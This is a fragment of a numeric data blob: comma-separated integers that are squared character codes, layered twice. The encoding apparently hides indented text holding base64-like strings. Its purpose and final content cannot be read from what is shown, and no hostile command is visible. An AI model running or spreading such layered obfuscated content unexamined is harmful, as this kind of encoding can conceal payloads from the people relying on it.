,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2916,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,2704,2704,3136,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2809,2916,2500,2809,1936,2809,3249,2500,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2916,3136,3136,3249,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,2916,3136,3136,3249,1936,2401,2304,2500,2304,2401,1936,2401,2401,2500,2601,2916,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2601,2704,2809,2916,1936,2704,3025,2916,2401,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,3025,3249,2500,2401,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2304,2916,2304,3249,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2916,2809,2916,2401,1936,2401,2401,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2500,3025,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2500,2500,2304,3249,1936,2809,3249,2500,3249,1936,3249,3136,2304,2401,1936,2500,2809,2304,2304,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2916,2704,2304,2304,1936,2401,2304,2704,2304,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2704,2809,2916,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2809,2601,2500,3249,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2500,3025,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2500,2500,2304,3249,1936,2809,3249,2500,3249,1936,3249,3136,2304,2401,1936,2500,2809,2304,2304,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2916,2704,2304,2304,1936,2401,2304,2704,2304,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2601,3249,2916,1936,2500,3025,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2704,2401,2916,2401,1936,2401,2704,2401,2916,2401,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2704,2401,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2809,2704,2704,1936,2401,2401,3136,3136,2401,1936,3249,2704,2304,3249,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2704,2809,2916,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2401,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2809,2704,2704,1936,2401,2401,3136,3136,2401,1936,3249,2704,2304,3249,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2601,3249,2916,1936,2500,3025,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2809,2601,2500,3249,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2704,2704,2304,2304,1936,2401,2401,2500,2601,2916,1936,2916,2809,2916,2401,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2500,2916,2304,2401,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2500,3025,2304,2704,1936,2809,2401,3136,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2809,2601,2500,3249,1936,2401,2401,2304,2500,2809,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2916,2704,2304,2304,1936,2500,3249,2401,2916,1936,2500,2500,2304,3249,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2601,2401,2601,2916,1936,2809,2401,3136,2704,1936,2500,2809,2304,2304,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2500,2601,2500,2401,1936,2704,3025,2916,2401,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2809,2601,2500,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2401,2304,3136,2401,2916,1936,2401,2601,2704,2809,2916,1936,2704,3025,2916,2401,1936,2401,2601,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2704,2916,2704,2401,1936,3249,2704,2304,3249,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2704,2601,2809,2916,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2401,2304,2500,2809,1936,3025,2304,2809,2916,1936,2916,2809,2916,2401,1936,2401,2401,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2401,2401,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2401,2304,3136,2401,2916,1936,2401,2601,2704,2809,2916,1936,2704,3025,2916,2401,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,2500,3025,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2401,2500,2601,2916,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,3136,3136,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,3249,2916,2304,2704,1936,2500,3025,2304,2704,1936,2401,2601,2704,2809,2916,1936,3249,2704,2304,3249,1936,3025,2809,2916,3249,1936,2401,2601,2704,2809,2916,1936,3249,2704,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2809,2601,2500,3249,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2401,2401,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,3136,3136,2704,1936,2601,2401,2601,2916,1936,2401,2500,2601,2500,2401,1936,2401,2500,2601,2500,2401,1936,2500,3249,2401,2916,1936,2916,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2704,3249,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,3136,2401,2916,1936,2500,2916,2304,2401,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2500,2809,2704,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2401,2401,2304,2500,2809,1936,2809,2601,2500,3249,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2500,2809,2704,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2401,3249,2601,2916,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2401,2304,2704,2304,2704,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2916,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2500,2601,2500,2401,1936,2500,3136,2304,3249,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2916,3136,3136,3249,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2916,2704,2304,2304,1936,2601,2401,2601,2916,1936,2704,3249,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2704,3249,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,3136,2401,2916,1936,2500,2916,2304,2401,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704